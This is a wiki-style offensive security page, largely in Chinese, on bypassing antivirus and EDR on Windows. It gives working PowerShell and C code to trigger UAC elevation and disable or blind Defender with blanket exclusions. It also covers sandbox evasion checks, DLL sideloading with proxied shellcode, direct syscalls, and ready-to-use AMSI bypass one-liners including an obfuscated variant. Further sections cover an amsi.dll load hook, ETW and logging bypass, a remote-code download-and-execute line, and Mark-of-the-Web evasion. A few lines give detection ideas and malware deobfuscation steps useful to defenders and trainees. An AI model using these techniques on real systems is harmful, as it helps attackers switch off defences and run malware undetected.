# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was initially written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 一个用于停止 Windows Defender 工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender): 一个通过伪装成另一个 AV 来停止 Windows Defender 工作的工具。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### 在篡改 Defender 之前的 installer-style UAC bait

公开的 loader 经常伪装成 game cheats，通常会以未签名的 Node.js/Nexe installer 形式分发，先**要求用户提权**，然后才禁用 Defender。流程很简单：

1. 使用 `net session` 探测是否处于 admin 上下文。该命令只有在调用者拥有 admin 权限时才会成功，因此失败表示 loader 正以标准用户身份运行。
2. 立即使用 `RunAs` 动词重新启动自身，以触发预期的 UAC consent prompt，同时保留原始 command line。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
受害者已经相信自己正在安装“cracked”软件，所以该提示通常会被接受，从而让 malware 获得修改 Defender policy 所需的权限。

### 为每个驱动器盘符设置统一的 `MpPreference` exclusions

一旦提权，GachiLoader-style chains 会优先最大化 Defender 的盲区，而不是直接禁用服务。loader 会先杀掉 GUI watchdog（`taskkill /F /IM SecHealthUI.exe`），然后推送 **极其宽泛的 exclusions**，让每个用户配置文件、系统目录以及可移动磁盘都无法被扫描：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
关键观察：

- 该循环会遍历所有已挂载的文件系统（D:\、E:\、USB 盘等），所以**任何未来丢到磁盘上任何位置的 payload 都会被忽略**。
- `.sys` 扩展名排除是面向未来的——攻击者保留以后加载未签名驱动的选项，而无需再次触碰 Defender。
- 所有更改都会落到 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 下，使后续阶段能够确认这些排除项是否仍在，或在不再次触发 UAC 的情况下扩展它们。

因为没有停止 Defender 服务，天真的健康检查仍会报告“antivirus active”，尽管实时扫描根本不会碰这些路径。

## **AV Evasion Methodology**

目前，AV 使用不同的方法来检查文件是否恶意：静态检测、动态分析，以及对于更高级的 EDR，behavioral analysis。

### **Static detection**

Static detection 是通过对二进制或脚本中的已知恶意字符串或字节数组进行标记来实现的，同时也会从文件本身提取信息（例如文件描述、公司名称、数字签名、图标、校验和等）。这意味着，使用已知的公开工具可能更容易被抓到，因为它们很可能已经被分析并标记为恶意。有几种方法可以绕过这类检测：

- **Encryption**

如果你加密了二进制文件，AV 就无法检测你的程序，但你将需要某种 loader 来在内存中解密并运行该程序。

- **Obfuscation**

有时你只需要更改二进制或脚本中的一些字符串，就能让它通过 AV，但这可能是一项耗时的工作，取决于你想混淆什么。

- **Custom tooling**

如果你开发自己的工具，就不会有已知的恶意特征，但这会花费大量时间和精力。

> [!TIP]
> 检查 Windows Defender static detection 的一个好方法是 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上会把文件拆成多个片段，然后让 Defender 逐个扫描，这样它就能准确告诉你二进制中哪些字符串或字节被标记了。

我强烈建议你看看这个关于实战 AV Evasion 的 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhKGf)。

### **Dynamic analysis**

Dynamic analysis 是指 AV 在 sandbox 中运行你的二进制并监视恶意活动（例如尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这一部分会稍微难处理一些，但你可以做一些事情来绕过 sandbox。

- **Sleep before execution** 取决于具体实现方式，这可能是绕过 AV dynamic analysis 的好办法。AV 只有很短的时间来扫描文件，以免打断用户工作流，因此使用较长的 sleep 可能会干扰对二进制的分析。问题在于，许多 AV 的 sandbox 会根据实现方式直接跳过 sleep。
- **Checking machine's resources** 通常 sandbox 只有很少的资源可用（例如 < 2GB RAM），否则它们可能会拖慢用户机器。你也可以在这里非常灵活，比如检查 CPU 温度，甚至风扇转速，不是所有内容都会在 sandbox 中实现。
- **Machine-specific checks** 如果你想针对一台加入了 "contoso.local" 域的用户工作站，你可以检查计算机所属域是否与你指定的匹配；如果不匹配，你可以让程序退出。

事实证明，Microsoft Defender 的 Sandbox 计算机名是 HAL9TH，所以你可以在恶意软件引爆前检查计算机名，如果名字匹配 HAL9TH，就说明你在 Defender 的 sandbox 里，因此可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit) 关于对抗 Sandboxes 的一些其他很好的建议

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

正如我们在这篇文章前面所说，**public tools** 最终都会**被检测到**，所以你应该问自己一个问题：

例如，如果你想 dump LSASS，**你真的需要使用 mimikatz 吗**？还是可以用另一个不那么知名、同样能 dump LSASS 的项目？

正确答案大概是后者。以 mimikatz 为例，它大概是被 AV 和 EDR 标记最多的 malware 之一，甚至可能就是最多的；虽然这个项目本身非常酷，但要想绕过 AV，和它配合使用简直是一场噩梦，所以只要为你想实现的目标去找替代方案就好。

> [!TIP]
> 当你为 evasion 修改 payload 时，务必在 defender 中**关闭自动样本提交**，而且请认真地说，**如果你的目标是长期实现 evasion，千万不要上传到 VIRUSTOTAL**。如果你想检查你的 payload 是否会被某个特定 AV 检测到，可以把它装在 VM 上，尝试关闭自动样本提交，然后在那里测试，直到你对结果满意为止。

## EXEs vs DLLs

只要有可能，始终**优先使用 DLLs 来做 evasion**。根据我的经验，DLL 文件通常**更不容易被检测和分析**，所以在某些情况下，这是一种非常简单的规避检测技巧（当然，前提是你的 payload 有某种方式能作为 DLL 运行）。

从这张图可以看到，Havoc 的一个 DLL Payload 在 antiscan.me 上的检测率是 4/26，而 EXE payload 的检测率是 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

现在我们将展示一些可以对 DLL 文件使用的技巧，让它们更隐蔽。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用 loader 使用的 DLL 搜索顺序，通过将受害者应用程序和恶意 payload(s) 并排放置来实现。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和下面的 powershell script 来检查哪些程序容易受到 DLL Sideloading 影响：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
此命令将输出 `C:\Program Files\\` 中易受 DLL hijacking 影响的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你**自己去探索可进行 DLL Hijack/Sideload 的程序**，如果操作得当，这种技术非常隐蔽；但如果你使用公开已知的 DLL Sideload 程序，很容易被抓到。

仅仅放置一个程序期望加载的恶意 DLL，并不会加载你的 payload，因为程序还期望该 DLL 内包含某些特定函数。为了解决这个问题，我们将使用另一种叫做 **DLL Proxying/Forwarding** 的技术。

**DLL Proxying** 会把程序从 proxy（以及恶意）DLL 发出的调用转发到原始 DLL，从而保留程序功能，并能够处理你的 payload 执行。

我将使用来自 [@flangvik](https://twitter.com/Flangvik/) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

我遵循了以下步骤：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一个命令会给我们 2 个文件：一个 DLL 源代码模板，以及原始重命名后的 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
这些是结果：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 上的检测率都是 0/26！我会把这称为成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我 **强烈建议** 你观看 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) 了解 DLL Sideloading，并观看 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) 进一步深入学习我们前面讨论的内容。

### 滥用 Forwarded Exports (ForwardSideLoading)

Windows PE modules 可以导出实际上是“forwarders”的函数：导出项不是指向代码，而是包含一个形如 `TargetDll.TargetFunc` 的 ASCII 字符串。当调用方解析该导出时，Windows loader 会：

- 如果 `TargetDll` 还未加载，则加载它
- 从中解析 `TargetFunc`

需要理解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，则它会从受保护的 KnownDLLs 命名空间提供（例如 ntdll、kernelbase、ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则会使用正常的 DLL 搜索顺序，其中包括执行 forward 解析的模块所在目录。

这就实现了一种间接 sideloading 原语：找到一个签名 DLL，它导出的某个函数被 forward 到一个非-KnownDLL 的模块名，然后把这个签名 DLL 与一个攻击者控制的 DLL 放在一起，并且该 DLL 的名字要与被 forward 的目标模块名完全一致。当该 forwarded export 被调用时，loader 会解析这个 forward，并从同一目录加载你的 DLL，执行你的 DllMain。

Windows 11 上观察到的示例：
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是一个 KnownDLL，所以它会通过正常搜索顺序来解析。

PoC（复制粘贴）：
1) 将已签名的系统 DLL 复制到一个可写文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 在同一文件夹中放置一个恶意的 `NCRYPTPROV.dll`。一个最小的 DllMain 就足以获得代码执行；你不需要实现转发的函数来触发 DllMain。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用已签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
观察到的行为：
- rundll32（签名）加载 side-by-side `keyiso.dll`（签名）
- 在解析 `KeyIsoSetAuditingInterface` 时，loader 会跟随 forward 到 `NCRYPTPROV.SetAuditingInterface`
- 然后 loader 会从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果 `SetAuditingInterface` 没有实现，你会在 `DllMain` 已经运行之后才看到“missing API”错误

Hunting tips：
- 重点关注那些目标模块不是 KnownDLL 的 forwarded exports。KnownDLLs 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 你可以使用如下工具枚举 forwarded exports：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 参见 Windows 11 forwarder inventory 以搜索候选项：https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins（例如 rundll32.exe）从非系统路径加载已签名 DLL，随后从该目录加载同名的非 KnownDLLs
- 对如下进程/模块链发出告警：`rundll32.exe` → 非系统 `keyiso.dll` → 用户可写路径下的 `NCRYPTPROV.dll`
- 强制执行代码完整性策略（WDAC/AppLocker），并禁止应用程序目录中的写入+执行

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

你可以使用 Freeze 以隐蔽方式加载并执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion 只是一个猫捉老鼠的游戏，今天有效的方法明天可能就会被检测到，所以不要只依赖一种工具，如果可能，尽量串联多种 evasion techniques。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs 经常在 `ntdll.dll` 的 syscall stubs 上设置 **user-mode inline hooks**。为了绕过这些 hooks，你可以生成 **direct** 或 **indirect** syscall stubs，它们会加载正确的 **SSN** (System Service Number)，并在不执行被 hook 的导出入口点的情况下切换到 kernel mode。

**Invocation options:**
- **Direct (embedded)**: 在生成的 stub 中发出一条 `syscall`/`sysenter`/`SVC #0` 指令（不会命中 `ntdll` export）。
- **Indirect**: 跳转到 `ntdll` 内部现有的 `syscall` gadget，这样 kernel transition 看起来就像是从 `ntdll` 发起的（对 heuristic evasion 很有用）；**randomized indirect** 会为每次调用从一个池中选择一个 gadget。
- **Egg-hunt**: 避免在磁盘上嵌入静态的 `0F 05` opcode 序列；在运行时解析 syscall 序列。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: 通过按 virtual address 对 syscall stubs 排序来推断 SSN，而不是读取 stub bytes。
- **SyscallsFromDisk**: 挂载一个干净的 `\KnownDlls\ntdll.dll`，从其 `.text` 中读取 SSN，然后卸载（绕过所有内存中的 hooks）。
- **RecycledGate**: 将按 VA 排序的 SSN 推断与 opcode 验证结合；当 stub 是干净的时进行验证；如果被 hook，则回退到 VA 推断。
- **HW Breakpoint**: 在 `syscall` 指令上设置 DR0，并使用 VEH 在运行时从 `EAX` 捕获 SSN，而不解析被 hook 的 bytes。

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI 被创建出来是为了阻止 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"。最初，AV 只能扫描**磁盘上的文件**，所以如果你能以某种方式**直接在内存中**执行 payload，AV 就无法做任何事情来阻止它，因为它没有足够的可见性。

AMSI 功能集成在 Windows 的这些组件中。

- User Account Control，或 UAC（提升 EXE、COM、MSI，或 ActiveX 安装）
- PowerShell（scripts、交互式使用，以及动态代码求值）
- Windows Script Host（wscript.exe 和 cscript.exe）
- JavaScript 和 VBScript
- Office VBA macros

它通过以一种既未加密也未混淆的形式暴露 script 内容，让 antivirus 解决方案能够检查 script 行为。

运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 会在 Windows Defender 上触发以下告警。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它如何在前面加上 `amsi:`，然后是 script 运行时所在可执行文件的路径，在这个例子里是 powershell.exe

我们没有把任何文件落地到磁盘，但仍然因为 AMSI 被内存中捕获。

此外，从 **.NET 4.8** 开始，C# code 也会通过 AMSI 运行。这甚至会影响用于在内存中执行加载的 `Assembly.Load(byte[])`。这就是为什么如果你想 evad AMSI，建议在内存中执行时使用更低版本的 .NET（比如 4.7.2 或更低）。

绕过 AMSI 有几种方法：

- **Obfuscation**

由于 AMSI 主要依赖静态检测，因此，修改你尝试加载的 scripts 会是 evading detection 的一种好方法。

然而，AMSI 具备对 scripts 进行去混淆的能力，即使它们有多层混淆，因此根据混淆方式不同，obfuscation 可能是个糟糕的选择。这让 evad 变得不那么直接。尽管如此，有时候你只需要改几个变量名就行，所以这取决于某样东西被标记得有多严重。

- **AMSI Bypass**

由于 AMSI 是通过把一个 DLL 加载进 powershell（还有 cscript.exe、wscript.exe 等）进程来实现的，因此即使作为无特权用户，也很容易对它进行篡改。由于 AMSI 实现上的这个缺陷，研究人员找到了多种 evad AMSI scanning 的方法。

**Forcing an Error**

强制 AMSI 初始化失败（amsiInitFailed）会导致当前进程不再启动任何 scan。最初这是由 [Matt Graeber](https://twitter.com/mattifestation) 披露的，Microsoft 后来开发了一个 signature 来阻止更广泛的使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
仅需一行 powershell code 就能让 AMSI 对当前 powershell process 失效。当然，这一行本身已经被 AMSI 标记了，因此需要做一些修改才能使用这个 technique。

这里是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 中拿到的一个修改版 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
记住，这很可能会在这篇文章发布后被标记，所以如果你的计划是保持不被发现，就不要发布任何 code。

**Memory Patching**

这项技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现，它涉及找到 amsi.dll 中 "AmsiScanBuffer" 函数的地址（该函数负责扫描用户提供的输入），并用指令覆盖它，使其返回 E_INVALIDARG 的 code，这样，实际扫描的结果会返回 0，并被解释为干净结果。

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获得更详细的解释。

还有很多其他用于通过 powershell 绕过 AMSI 的技术，查看 [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) 和 [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 以了解更多。

### 通过阻止 amsi.dll 加载来阻断 AMSI（LdrLoadDll hook）

AMSI 只会在 `amsi.dll` 加载到当前进程后才初始化。一个稳健、与语言无关的 bypass 是在 `ntdll!LdrLoadDll` 上放置一个用户态 hook：当请求的模块是 `amsi.dll` 时返回错误。这样，AMSI 就永远不会加载，该进程也就不会发生任何扫描。

实现概要（x64 C/C++ pseudocode）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- 适用于 PowerShell、WScript/CScript 以及自定义 loaders（任何原本会加载 AMSI 的东西）。
- 可配合通过 stdin 传入 scripts（`PowerShell.exe -NoProfile -NonInteractive -Command -`）来避免留下较长的 command-line 痕迹。
- 也见于通过 LOLBins 执行的 loaders（例如，`regsvr32` 调用 `DllRegisterServer`）。

工具 **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** 也可以生成用于绕过 AMSI 的 script。
工具 **[https://amsibypass.com/](https://amsibypass.com/)** 也可以生成用于绕过 AMSI 的 script，通过随机化 user-defined function、variables、characters expression，并对 PowerShell keywords 应用随机大小写来避免 signature。

**移除检测到的 signature**

你可以使用 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 之类的工具，从当前 process 的 memory 中移除检测到的 AMSI signature。该工具通过扫描当前 process 的 memory 中的 AMSI signature，然后用 NOP instructions 覆盖它，从而有效地将其从 memory 中移除。

**使用 AMSI 的 AV/EDR products**

你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 中找到使用 AMSI 的 AV/EDR products 列表。

**使用 Powershell version 2**
如果你使用 PowerShell version 2，AMSI 将不会被加载，因此你可以在不被 AMSI 扫描的情况下运行你的 scripts。你可以这样做：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging 是一项功能，允许你记录系统上执行的所有 PowerShell 命令。这对于审计和排障很有用，但对于**想要规避检测的攻击者来说，这也可能是一个问题**。

要绕过 PowerShell logging，你可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**：你可以使用类似 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 的工具来实现这一点。
- **Use Powershell version 2**：如果你使用 PowerShell version 2，AMSI 不会被加载，因此你可以运行脚本而不会被 AMSI 扫描。你可以这样做：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**：使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 来启动一个没有防御的 powershell（这就是 Cobal Strike 中 `powerpick` 使用的方式）。


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目旨在提供一个开源的 [LLVM](http://www.llvm.org/) 编译套件分支，能够通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改来提升软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示了如何使用 `C++11/14` 语言，在编译时生成 obfuscated code，而无需使用任何外部工具，也无需修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 通过 C++ template metaprogramming 框架添加一层 obfuscated operations，这会让想要破解该应用的人更难下手一些。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 binary obfuscator，能够混淆多种不同的 pe files，包括：.exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个用于任意 executables 的简单 metamorphic code engine。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个用于 LLVM-supported languages 的细粒度 code obfuscation framework，使用 ROP (return-oriented programming)。ROPfuscator 通过将常规指令转换为 ROP chains，在 assembly code level 对程序进行混淆，从而破坏我们对正常 control flow 的自然认知。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是一个用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode，然后再加载它们

## SmartScreen & MoTW

你可能在从 internet 下载一些 executables 并执行它们时见过这个界面。

Microsoft Defender SmartScreen 是一种安全机制，旨在保护最终用户免于运行可能恶意的 applications。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要基于 reputation 的方法工作，这意味着不常见下载的 applications 会触发 SmartScreen，从而提醒并阻止最终用户执行该文件（不过仍然可以通过点击 More Info -> Run anyway 来执行）。

**MoTW** (Mark of The Web) 是一个 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，名称为 Zone.Identifier，它会在从 internet 下载文件时自动创建，同时还会包含下载来源 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从 internet 下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 需要注意的是，使用 **trusted** signing certificate 签名的 executables **won't trigger SmartScreen**。

一种非常有效的防止 payloads 获得 Mark of The Web 的方法，是把它们打包进某种容器中，比如 ISO。之所以可行，是因为 Mark-of-the-Web (MOTW) **cannot** 被应用到 **non NTFS** 卷上。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包到输出容器中以规避 Mark-of-the-Web 的工具。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
这里有一个通过使用 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) 将 payload 打包进 ISO 文件来绕过 SmartScreen 的演示

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一种强大的日志机制，允许应用程序和系统组件 **记录事件**。不过，它也可以被安全产品用来监控和检测恶意活动。

类似于 AMSI 被禁用（bypassed）的方式，也可以让用户态进程中的 **`EtwEventWrite`** 函数立即返回而不记录任何事件。方法是在内存中 patch 该函数，使其直接返回，从而有效禁用该进程的 ETW 日志记录。

更多信息可参考 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 和 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**。


## C# Assembly Reflection

在内存中加载 C# binaries 早已是人们熟知的方法，而且至今仍然是运行 post-exploitation 工具而不被 AV 发现的非常有效的方式。

